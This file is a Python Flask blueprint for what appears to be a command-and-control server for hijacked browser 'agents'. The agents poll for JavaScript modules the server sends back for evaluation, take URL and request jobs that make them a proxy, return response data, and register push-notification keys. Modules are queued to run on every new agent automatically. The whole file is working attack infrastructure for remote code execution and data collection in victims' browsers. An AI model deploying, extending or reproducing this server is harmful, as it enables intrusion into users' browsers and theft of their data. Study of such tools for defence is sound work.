import time
import json
import re
from datetime import datetime
from app import db, ConnectedAgents, extraModules, AutomaticModuleExecution
from flask import jsonify, request, Blueprint, Response, render_template
from database.models import Url, Registration, Agent, Module
from config import Config

agent = Blueprint('agent', __name__)

REQUEST_TTL = 60*2 #60*60*24*100 #2 minutes

@agent.before_request
def verify_token():
    url_params = request.view_args
    token = (url_params and url_params.pop('token', None)) or None
    if token != Config.AGENT_TOKEN:
        return Response("", 404)

@agent.after_request
def apply_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "*"
    return response

@agent.route('/get')
def geturl():
    ###START UI #####
    agentID = str(request.args.get('agentID'))
    if agentID is None or agentID == '':
        return Response("", 404)
        
    # avoid potential for XSS when rendered back in the dashboard
    agentID = safeParam(agentID)
    
    if agentID not in ConnectedAgents:
        ConnectedAgents[agentID] = {'first_seen': time.time(), \
                                    'domain': safeParam(request.args.get('domain')), \
                                    'port': safeParam(request.args.get('port'))}
        print("Created new agent")
    else:
        print("Existing agent")

    ConnectedAgents[agentID]['id'] = agentID    
    ConnectedAgents[agentID]['ip'] = safeParam(request.remote_addr)
    ConnectedAgents[agentID]['last_seen'] = time.time()
    ConnectedAgents[agentID]['active'] = 'true'
    
    updateAgent(agentID, ConnectedAgents[agentID])
    
    #ConnectedAgents["fakeagent"]= {"first_seen":1542131642.440264,"ip":"127.0.0.8","last_seen":1542131646.856621}

    ###END UI ####
    
    module = db.session.query(Module).filter(Module.agentId == agentID, Module.processed == 0).order_by(Module.id.desc()).first()
    if module is not None:
        module.processed = 1
        db.session.commit()
        to_eval = render_template('modules/' + module.name +'.js')
        return jsonify({'EVAL': to_eval})
        
    timestamp = datetime.fromtimestamp(int(time.time()) - REQUEST_TTL).strftime('%Y-%m-%d %H:%M:%S')
    url = db.session.query(Url).filter(Url.processed == 0, Url.time_stamp > timestamp, Url.agentId == agentID).first()

    if url is None:
        return "{}"

    myuid = url.id
    url.processed = 1
    db.session.commit()
    results = {}
    results['ID'] = myuid
    results['URL'] = url.url
    results['Request'] = json.loads(url.request)
    return jsonify(results)
    
@agent.route('/put/<uuid>', methods = ['POST'])
def addData(uuid):
    content = request.get_json(silent = True)
    if content == None:
        print("CONTENT NONE")
        return Response("", 404)
    if 'DATA' in content.keys():
        print("--rcv-->" + uuid)
        url = db.session.query(Url).filter(Url.id == uuid).first()
        if url is None:
            return Response("", 404)
        url.response = request.data
        db.session.commit()
        return "commited"    
    print("NO DATA in POST")
    return Response("", 404)
    
@agent.route('/registration', methods = ['POST'])
def registration():
    body = request.get_json(silent = True)
    if body and body['endpoint'] and body['key'] and body['authSecret'] and body['agentID']:
        registration = Registration(None, body['endpoint'], body['key'], body['authSecret'], body['agentID'])
        db.session.add(registration)
        db.session.commit()
        return ""
    return Response("", 404)

@agent.route('/module/<moduleName>/<agentID>', methods = ['POST'])
def saveModuleData(moduleName, agentID):
    if moduleName not in extraModules['modules']:
        return Response("", 404)
    module = db.session().query(Module).filter(Module.agentId == agentID, Module.name == moduleName, Module.processed == 1).first()
    if module is None:
        return Response("", 404)
    if 'result' not in request.form:
        return Response("", 404)
    module.results = module.results + request.form['result']
    db.session().commit()
    return ""

def updateAgent(agentID, params):
    now = datetime.now()
    agent = db.session().query(Agent).filter(Agent.id == agentID).first()
    if agent is None:
        agent = Agent(agentID, now, now, params['domain'], params['port'], params['ip'])
        db.session.add(agent)
        addModulesToNewAgent(agent)
    else:
        agent.last_seen = now
        agent.ip = params['ip']
    db.session.commit()

def safeParam(param):
    return ''.join(re.findall(r'(\w+|-|\.)', param))

# Auto load selected modules against new agents
def addModulesToNewAgent(agent):
    for extraModule in AutomaticModuleExecution:
        module = Module(None, agent.id, extraModule, '', 0, datetime.now())
        db.session().add(module)